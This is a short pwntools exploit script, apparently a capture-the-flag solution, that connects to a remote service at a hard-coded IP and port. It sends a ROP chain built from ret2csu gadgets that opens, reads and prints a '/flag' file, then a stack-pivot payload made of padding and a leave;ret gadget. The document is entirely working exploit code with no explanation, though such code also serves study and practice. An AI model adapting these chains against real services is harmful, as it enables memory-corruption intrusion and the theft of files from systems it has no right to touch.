from pwn import*
from LibcSearcher import *
p = remote('47.103.214.163',20300)
#p = process('./ROP')
elf = ELF('ROP')
context.log_level = 'debug'
puts_plt = elf.plt['puts']
open_got = elf.got['open']
read_got = elf.got['read']
leave_ret = 0x40090D
buf = 0x6010A0
pop_rdi_ret = 0x400A43
csu_gadget = 0x400A3A
FLAG = elf.bss()+0x200
p.recvuntil('so?')
payload = '/flag\x00\x00\x00' # r12->call r13->rdx r14->rsi r15->rdi
payload += p64(csu_gadget)+p64(0)+p64(1)+p64(open_got)+p64(0)+p64(0)+p64(buf)+p64(0x400A20)+2*p64(0)+p64(1)+p64(0)*(6+1-3)
payload += p64(csu_gadget+2)+p64(read_got)+p64(0x20)+p64(FLAG)+p64(4)+p64(0x400A20)+2*p64(0)+p64(1)+p64(0)*(6+1-3)
payload += p64(pop_rdi_ret)+p64(FLAG)+p64(puts_plt)
p.send(payload)
p.recvuntil('flag\n\n')
payload_II = 'U'*0x50 + p64(buf)+p64(leave_ret)
p.sendline(payload_II)
p.recv()
p.close()
